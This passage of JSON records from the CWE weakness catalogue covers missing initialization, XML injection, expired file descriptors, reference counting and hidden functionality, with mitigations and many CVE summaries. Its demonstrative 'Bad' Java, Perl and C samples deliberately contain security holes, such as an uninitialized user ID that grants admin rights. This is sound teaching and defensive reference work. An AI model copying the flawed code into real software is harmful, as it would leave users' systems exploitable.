A-206718630"}, {"Reference": "CVE-2022-26437", "Description": "In httpclient, there is a possible out of bounds write due to uninitialized data. This could lead to remote escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: WSAP00103831; Issue ID: WSAP00103831."}, {"Reference": "CVE-2022-2949", "Description": " Altair HyperView Player versions 2021.1.0.27 and prior are vulnerable to the use of uninitialized memory vulnerability during parsing of H3D files. A DWORD is extracted from an uninitialized buffer and, after sign extension, is used as an index into a stack variable to increment a counter leading to memory corruption. "}, {"Reference": "CVE-2022-2950", "Description": " Altair HyperView Player versions 2021.1.0.27 and prior are vulnerable to the use of uninitialized memory vulnerability during parsing of H3D files. A DWORD is extracted from an uninitialized buffer and, after sign extension, is used as an index into a stack variable to increment a counter leading to memory corruption. "}, {"Reference": "CVE-2022-32615", "Description": "In ccd, there is a possible out of bounds write due to uninitialized data. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07326559; Issue ID: ALPS07326559."}, {"Reference": "CVE-2022-32616", "Description": "In isp, there is a possible out of bounds write due to uninitialized data. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07341258; Issue ID: ALPS07341258."}, {"Reference": "CVE-2022-39283", "Description": "FreeRDP is a free remote desktop protocol library and clients. All FreeRDP based clients when using the `/video` command line switch might read uninitialized data, decode it as audio/video and display the result. FreeRDP based server implementations are not affected. This issue has been patched in version 2.8.1. If you cannot upgrade do not use the `/video` switch."}, {"Reference": "CVE-2022-48303", "Description": "GNU Tar through 1.34 has a one-byte out-of-bounds read that results in use of uninitialized memory for a conditional jump. Exploitation to change the flow of control has not been demonstrated. The issue occurs in from_header in list.c via a V7 archive in which mtime has approximately 11 whitespace characters."}, {"Reference": "CVE-2022-20015", "Description": "In kd_camera_hw driver, there is a possible information disclosure due to uninitialized data. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS05862966; Issue ID: ALPS05862966."}, {"Reference": "CVE-2022-20079", "Description": "In vow, there is a possible read of uninitialized data due to a improper input validation. This could lead to local information disclosure with System execution privileges needed. User interaction is no needed for exploitation. Patch ID: ALPS05837742; Issue ID: ALPS05857289."}, {"Reference": "CVE-2022-20176", "Description": "In auth_store of sjtag-driver.c, there is a possible read of uninitialized memory due to a missing bounds check. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-197787879References: N/A"}, {"Reference": "CVE-2022-20357", "Description": "In writeToParcel of SurfaceControl.cpp, there is a possible information disclosure due to uninitialized data. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12 Android-12LAndroid ID: A-214999987"}, {"Reference": "CVE-2022-24448", "Description": "An issue was discovered in fs/nfs/dir.c in the Linux kernel before 5.16.5. If an application sets the O_DIRECTORY flag, and tries to open a regular file, nfs_atomic_open() performs a regular lookup. If a regular file is found, ENOTDIR should occur, but the server instead returns uninitialized data in the file descriptor."}, {"Reference": "CVE-2022-38668", "Description": "HTTP applications (servers) based on Crow through 1.0+4 may reveal potentially sensitive uninitialized data from stack memory when fulfilling a request for a static file smaller than 16 KB."}, {"Reference": "CVE-2022-41862", "Description": "In PostgreSQL, a modified, unauthenticated server can send an unterminated string during the establishment of Kerberos transport encryption. In certain conditions a server can cause a libpq client to over-read and report an error message containing uninitialized bytes."}, {"Reference": "CVE-2021-0946", "Description": "The method PVRSRVBridgePMRPDumpSymbolicAddr allocates puiMemspaceNameInt on the heap, fills the contents of the buffer via PMR_PDumpSymbolicAddr, and then copies the buffer to userspace. The method PMR_PDumpSymbolicAddr may fail, and if it does the buffer will be left uninitialized and despite the error will still be copied to userspace. Kernel leak of uninitialized heap data with no privs required.Product: AndroidVersions: Android SoCAndroid ID: A-236846966"}, {"Reference": "CVE-2021-0947", "Description": "The method PVRSRVBridgeTLDiscoverStreams allocates puiStreamsInt on the heap, fills the contents of the buffer via TLServerDiscoverStreamsKM, and then copies the buffer to userspace. The method TLServerDiscoverStreamsKM may fail for several reasons including invalid sizes. If this method fails the buffer will be left uninitialized and despite the error will still be copied to userspace. Kernel leak of uninitialized heap data with no privs required.Product: AndroidVersions: Android SoCAndroid ID: A-236838960"}, {"Reference": "CVE-2022-0494", "Description": "A kernel information leak flaw was identified in the scsi_ioctl function in drivers/scsi/scsi_ioctl.c in the Linux kernel. This flaw allows a local attacker with a special user privilege (CAP_SYS_ADMIN or CAP_SYS_RAWIO) to create issues with confidentiality."}]}
{"ID": "909", "Name": "Missing Initialization of Resource", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not initialize a critical resource.", "ExtendedDescription": "Many resources require initialization before they can be properly used. If a resource is not initialized, it could contain unpredictable or expired data, or it could be initialized to defaults that are invalid. This can have security implications when the resource is expected to have certain properties or values.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "665", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "665", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "908", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}, {"Ordinality": "Resultant"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Memory", "Read Application Data"], "Note": "When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all specified steps."}, {"Phase": ["Implementation"], "Description": "Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization."}, {"Phase": ["Implementation"], "Description": "Avoid race conditions (CWE-362) during initialization routines."}, {"Phase": ["Build and Compilation"], "Description": "Run or compile your product with settings that generate warnings about uninitialized variables or data."}], "DemonstrativeExamples": [{"ID": "DX-105", "Entries": [{"IntroText": "Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprivate boolean initialized = true;\n\tpublic void someMethod() {\n\t\t\tif (!initialized) {\n```\n// perform initialization tasks* \n\t\t\t\t\t...\n\t\t\t\t\t\n\t\t\t\t\tinitialized = true;}"}]}, {"ID": "DX-54", "Entries": [{"IntroText": "The following code intends to limit certain operations to the administrator only."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\t$username = GetCurrentUser();\n\t$state = GetStateData($username);\n\tif (defined($state)) {\n\t\t$uid = ExtractUserID($state);\n\t}\n```\n# do stuff* \n\tif ($uid == 0) {\n\t```\n\t\tDoAdminThings();\n\t}\n```"}, {"BodyText": "If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."}]}, {"Entries": [{"IntroText": "The following code intends to concatenate a string to a variable and print the string."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar str[20];\n\tstrcat(str, \"hello world\");\n\tprintf(\"%s\", str);\n```"}, {"BodyText": "This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory."}, {"BodyText": "If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found."}, {"BodyText": "If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash."}]}, {"ID": "DX-144", "Entries": [{"IntroText": "This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"}, {"BodyText": "When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).\n\n\n To fix this code, there are a couple approaches to making sure that test_string has been properly set once it reaches the printf().\n\n\nOne solution would be to set test_string to an acceptable default before the conditional:"}, {"Nature": "Good", "Language": "C", "ExampleCode": "char *test_string = \"Done at the beginning\";\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"}, {"BodyText": "Another solution is to ensure that each branch of the conditional - including the default/else branch - could ensure that test_string is set:"}, {"Nature": "Good", "Language": "C", "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n else {\n\ttest_string = \"Done on the other side!\";\n }\n printf(\"%s\", test_string);\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2020-20739", "Description": "A variable that has its value set in a conditional statement is sometimes used when the conditional fails, sometimes causing data leakage", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-20739"}, {"Reference": "CVE-2005-1036", "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-1016", "Description": "A flaw was found in the Linux kernel in net/netfilter/nf_tables_core.c:nft_do_chain, which can cause a use-after-free. This issue needs to handle 'return' with proper preconditions, as it can lead to a kernel information leak problem caused by a local, unprivileged attacker."}, {"Reference": "CVE-2022-0175", "Description": "A flaw was found in the VirGL virtual OpenGL renderer (virglrenderer). The virgl did not properly initialize memory when allocating a host-backed memory resource. A malicious guest could use this flaw to mmap from the guest kernel and read this uninitialized memory from the host, possibly leading to information disclosure."}, {"Reference": "CVE-2022-0382", "Description": "An information leak flaw was found due to uninitialized memory in the Linux kernel's TIPC protocol subsystem, in the way a user sends a TIPC datagram to one or more destinations. This flaw allows a local user to read some kernel memory. This issue is limited to no more than 7 bytes, and the user cannot control what is read. This flaw affects the Linux kernel versions prior to 5.17-rc1."}, {"Reference": "CVE-2021-0946", "Description": "The method PVRSRVBridgePMRPDumpSymbolicAddr allocates puiMemspaceNameInt on the heap, fills the contents of the buffer via PMR_PDumpSymbolicAddr, and then copies the buffer to userspace. The method PMR_PDumpSymbolicAddr may fail, and if it does the buffer will be left uninitialized and despite the error will still be copied to userspace. Kernel leak of uninitialized heap data with no privs required.Product: AndroidVersions: Android SoCAndroid ID: A-236846966"}, {"Reference": "CVE-2021-0947", "Description": "The method PVRSRVBridgeTLDiscoverStreams allocates puiStreamsInt on the heap, fills the contents of the buffer via TLServerDiscoverStreamsKM, and then copies the buffer to userspace. The method TLServerDiscoverStreamsKM may fail for several reasons including invalid sizes. If this method fails the buffer will be left uninitialized and despite the error will still be copied to userspace. Kernel leak of uninitialized heap data with no privs required.Product: AndroidVersions: Android SoCAndroid ID: A-236838960"}]}
{"ID": "91", "Name": "XML Injection (aka Blind XPath Injection)", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.", "ExtendedDescription": "Within XML, special elements could include reserved words or characters such as \"<\", \">\", \"\"\", and \"&\", which could then be used to add new data or modify XML syntax.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "74", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "74", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands", "Read Application Data", "Modify Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}], "RelatedAttackPatterns": ["250", "83"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "The description for this entry is generally applicable to XML, but the name includes \"blind XPath injection\" which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652."}, {"Type": "Theoretical", "Note": "In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error."}, {"Type": "Research Gap", "Note": "Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples."}], "Top25Examples": [{"Reference": "CVE-2022-22243", "Description": "An XPath Injection vulnerability due to Improper Input Validation in the J-Web component of Juniper Networks Junos OS allows an authenticated attacker to add an XPath command to the XPath stream, which may allow chaining to other unspecified vulnerabilities, leading to a partial loss of confidentiality. This issue affects Juniper Networks Junos OS: all versions prior to 19.1R3-S9; 19.2 versions prior to 19.2R3-S6; 19.3 versions prior to 19.3R3-S7; 19.4 versions prior to 19.4R2-S7, 19.4R3-S8; 20.1 versions prior to 20.1R3-S5; 20.2 versions prior to 20.2R3-S5; 20.3 versions prior to 20.3R3-S5; 20.4 versions prior to 20.4R3-S4; 21.1 versions prior to 21.1R3-S2; 21.2 versions prior to 21.2R3-S1; 21.3 versions prior to 21.3R2-S2, 21.3R3; 21.4 versions prior to 21.4R1-S2, 21.4R2-S1, 21.4R3; 22.1 versions prior to 22.1R1-S1, 22.1R2."}, {"Reference": "CVE-2022-24039", "Description": "A vulnerability has been identified in Desigo PXC4 (All versions < V02.20.142.10-10884), Desigo PXC5 (All versions < V02.20.142.10-10884). The \u201caddCell\u201d JavaScript function fails to properly sanitize user-controllable input before including it into the generated XML body of the XLS report document, such that it is possible to inject arbitrary content (e.g., XML tags) into the generated file. An attacker with restricted privileges, by poisoning any of the content used to generate XLS reports, could be able to leverage the application to deliver malicious files against higher-privileged users and obtain Remote Code Execution (RCE) against the administrator\u2019s workstation."}]}
{"ID": "910", "Name": "Use of Expired File Descriptor", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses or accesses a file descriptor after it has been closed.", "ExtendedDescription": "After a file descriptor for a particular file or device has been released, it can be reused. The code might not write to the original file, since the reused file descriptor might reference a different file or device.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "672", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}, {"Ordinality": "Resultant"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Sometimes"}, {"Type": "Language", "Name": "C++", "Prevalence": "Sometimes"}, {"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Stale file descriptor"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Files or Directories"], "Note": "The program could read data from the wrong file."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "Accessing a file descriptor that has been closed can cause a crash."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "911", "Name": "Improper Update of Reference Count", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a reference count to manage a resource, but it does not update or incorrectly updates the reference count.", "ExtendedDescription": "Reference counts can be used when tracking how many objects contain a reference to a particular resource, such as in memory management or garbage collection. When the reference count reaches zero, the resource can be de-allocated or reused because there are no more objects that use it. If the reference count accidentally reaches zero, then the resource might be released too soon, even though it is still in use. If all objects no longer use the resource, but the reference count is not zero, then the resource might not ever be released.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "672", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "772", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Sometimes"}, {"Type": "Language", "Name": "C++", "Prevalence": "Sometimes"}, {"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "ObservedExamples": [{"Reference": "CVE-2002-0574", "Description": "chain: reference count is not decremented, leading to memory leak in OS by sending ICMP packets.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0574"}, {"Reference": "CVE-2004-0114", "Description": "Reference count for shared memory not decremented when a function fails, potentially allowing unprivileged users to read kernel memory.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0114"}, {"Reference": "CVE-2006-3741", "Description": "chain: improper reference count tracking leads to file descriptor consumption", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-3741"}, {"Reference": "CVE-2007-1383", "Description": "chain: integer overflow in reference counter causes the same variable to be destroyed twice.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1383"}, {"Reference": "CVE-2007-1700", "Description": "Incorrect reference count calculation leads to improper object destruction and code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1700"}, {"Reference": "CVE-2008-2136", "Description": "chain: incorrect update of reference count leads to memory leak.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2136"}, {"Reference": "CVE-2008-2785", "Description": "chain/composite: use of incorrect data type for a reference counter allows an overflow of the counter, leading to a free of memory that is still in use.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2785"}, {"Reference": "CVE-2008-5410", "Description": "Improper reference counting leads to failure of cryptographic operations.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5410"}, {"Reference": "CVE-2009-1709", "Description": "chain: improper reference counting in a garbage collection routine leads to use-after-free", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1709"}, {"Reference": "CVE-2009-3553", "Description": "chain: reference count not correctly maintained when client disconnects during a large operation, leading to a use-after-free.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3553"}, {"Reference": "CVE-2009-3624", "Description": "Reference count not always incremented, leading to crash or code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3624"}, {"Reference": "CVE-2010-0176", "Description": "improper reference counting leads to expired pointer dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0176"}, {"Reference": "CVE-2010-0623", "Description": "OS kernel increments reference count twice but only decrements once, leading to resource consumption and crash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0623"}, {"Reference": "CVE-2010-2549", "Description": "OS kernel driver allows code execution", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2549"}, {"Reference": "CVE-2010-4593", "Description": "improper reference counting leads to exhaustion of IP addresses", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4593"}, {"Reference": "CVE-2011-0695", "Description": "Race condition causes reference counter to be decremented prematurely, leading to the destruction of still-active object and an invalid pointer dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0695"}, {"Reference": "CVE-2012-4787", "Description": "improper reference counting leads to use-after-free", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-4787"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-3304", "Description": "Use after free in CSS in Google Chrome prior to 106.0.5249.62 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)"}, {"Reference": "CVE-2022-20109", "Description": "In ion, there is a possible use after free due to improper update of reference count. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06399915; Issue ID: ALPS06399915."}, {"Reference": "CVE-2022-29581", "Description": "Improper Update of Reference Count vulnerability in net/sched of Linux Kernel allows local attacker to cause privilege escalation to root. This issue affects: Linux Kernel versions prior to 5.18; version 4.14 and later versions."}, {"Reference": "CVE-2022-38999", "Description": "The AOD module has the improper update of reference count vulnerability. Successful exploitation of this vulnerability may affect data integrity, confidentiality, and availability."}, {"Reference": "CVE-2022-3910", "Description": "Use After Free vulnerability in Linux Kernel allows Privilege Escalation. An improper Update of Reference Count in io_uring leads to Use-After-Free and Local Privilege Escalation. When io_msg_ring was invoked with a fixed file, it called io_fput_file() which improperly decreased its reference count (leading to Use-After-Free and Local Privilege Escalation). Fixed files are permanently registered to the ring, and should not be put separately. We recommend upgrading past commit https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679 https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679 "}]}
{"ID": "912", "Name": "Hidden Functionality", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the product's users or administrators.", "ExtendedDescription": "Hidden functionality can take many forms, such as intentionally malicious code, \"Easter Eggs\" that contain extraneous functionality such as games, developer-friendly shortcuts that reduce maintenance or support costs such as hard-coded accounts, etc. From a security perspective, even when the functionality is not intentionally malicious or damaging, it can increase the product's attack surface and expose additional weaknesses beyond what is already exposed by the intended functionality. Even if it is not easily accessible, the hidden functionality could be useful for attacks that modify the control flow of the application.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "684", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other", "Integrity"], "Impact": ["Varies by Context", "Alter Execution Logic"]}], "PotentialMitigations": [{"Phase": ["Installation"], "Description": "Always verify the integrity of the product that is being installed."}, {"Phase": ["Testing"], "Description": "Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered."}], "ObservedExamples": [{"Reference": "CVE-2022-31260", "Description": "Chain: a digital asset management program has an undisclosed backdoor in the legacy version of a PHP script (CWE-912) that could allow an unauthenticated user to export metadata (CWE-306)", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-31260"}, {"Reference": "CVE-2022-3203", "Description": "A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3203"}], "RelatedAttackPatterns": ["133", "190"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-3203", "Description": "On ORing net IAP-420(+) with FW version 2.0m a telnet server is enabled by default and cannot permanently be disabled. You can connect to the device via LAN or WiFi with hardcoded credentials and get an administrative shell. These credentials are reset to defaults with every reboot."}, {"Reference": "CVE-2021-20716", "Description": "Hidden functionality in multiple Buffalo network devices (BHR-4RV firmware Ver.2.55 and prior, FS-G54 firmware Ver.2.04 and prior, WBR2-B11 firmware Ver.2.32 and prior, WBR2-G54 firmware Ver.2.32 and prior, WBR2-G54-KD firmware Ver.2.32 and prior, WBR-B11 firmware Ver.2.23 and prior, WBR-G54 firmware Ver.2.23 and prior, WBR-G54L firmware Ver.2.20 and prior, WHR2-A54G54 firmware Ver.2.25 and prior, WHR2-G54 firmware Ver.2.23 and prior, WHR2-G54V firmware Ver.2.55 and prior, WHR3-AG54 firmware Ver.2.23 and prior, WHR-G54 firmware Ver.2.16 and prior, WHR-G54-NF firmware Ver.2.10 and prior, WLA2-G54 firmware Ver.2.24 and prior, WLA2-G54C firmware Ver.2.24 and prior, WLA-B11 firmware Ver.2.20 and prior, WLA-G54 firmware Ver.2.20 and prior, WLA-G54C firmware Ver.2.20 and prior, WLAH-A54G54 firmware Ver.2.54 and prior, WLAH-AM54G54 firmware Ver.2.54 and prior, WLAH-G54 firmware Ver.2.54 and prior, WLI2-TX1-AG54 firmware Ver.2.53 and prior, WLI2-TX1-AMG54 firmware Ver.2.53 and prior, WLI2-TX1-G54 firmware Ver.2.20 and prior, WLI3-TX1-AMG54 firmware Ver.2.53 and prior, WLI3-TX1-G54 firmware Ver.2.53 and prior, WLI-T1-B11 firmware Ver.2.20 and prior, WLI-TX1-G54 firmware Ver.2.20 and prior, WVR-G54-NF firmware Ver.2.02 and prior, WZR-G108 firmware Ver.2.41 and prior, WZR-G54 firmware Ver.2.41 and prior, WZR-HP-G54 firmware Ver.2.41 and prior, WZR-RS-G54 firmware Ver.2.55 and prior, and WZR-RS-G54HP firmware Ver.2.55 and prior) allows a remote attacker to enable the debug option and to execute arbitrary code or OS commands, change the configuration, and cause a denial of service (DoS) condition."}, {"Reference": "CVE-2022-21173", "Description": "Hidden functionality vulnerability in ELECOM LAN routers (WRH-300BK3 firmware v1.05 and earlier, WRH-300WH3 firmware v1.05 and earlier, WRH-300BK3-S firmware v1.05 and earlier, WRH-300DR3-S firmware v1.05 and earlier, WRH-300LB3-S firmware v1.05 and earlier, WRH-300PN3-S firmware v1.05 and earlier, WRH-300WH3-S firmware v1.05 and earlier, and WRH-300YG3-S firmware v1.05 and earlier) allows an attacker on the adjacent network to execute an arbitrary OS command via unspecified vectors."}, {"Reference": "CVE-2022-39044", "Description": "Hidden functionality vulnerability in multiple Buffalo network devices allows a network-adjacent attacker with an administrative privilege to execute an arbitrary OS command. The affected products/versions are as follows: WCR-300 firmware Ver. 1.87 and earlier, WHR-HP-G300N firmware Ver. 2.00 and earlier, WHR-HP-GN firmware Ver. 1.87 and earlier, WPL-05G300 firmware Ver. 1.88 and earlier, WZR-300HP firmware Ver. 2.00 and earlier, WZR-450HP firmware Ver. 2.00 and earlier, WZR-600DHP firmware Ver. 2.00 and earlier, WZR-900DHP firmware Ver. 1.15 and earlier, WZR-HP-AG300H firmware Ver. 1.76 and earlier, WZR-HP-G302H firmware Ver. 1.86 and earlier, WLAE-AG300N firmware Ver. 1.86 and earlier, FS-600DHP firmware Ver. 3.40 and earlier, FS-G300N firmware Ver. 3.14 and earlier, FS-HP-G300N firmware Ver. 3.33 and earlier, FS-R600DHP firmware Ver. 3.40 and earlier, BHR-4GRV firmware Ver. 2.00 and earlier, DWR-HP-G300NH firmware Ver. 1.84 and earlier, DWR-PG firmware Ver. 1.83 and earlier, HW-450HP-ZWE firmware Ver. 2.00 and earlier, WER-A54G54 firmware Ver. 1.43 and earlier, WER-AG54 firmware Ver. 1.43 and earlier, WER-AM54G54 firmware Ver. 1.43 and earlier, WER-AMG54 firmware Ver. 1.43 and earlier, WHR-300 firmware Ver. 2.00 and earlier, WHR-300HP firmware Ver. 2.00 and earlier, WHR-AM54G54 firmware Ver. 1.43 and earlier, WHR-AMG54 firmware Ver. 1.43 and earlier, WHR-AMPG firmware Ver. 1.52 and earlier, WHR-G 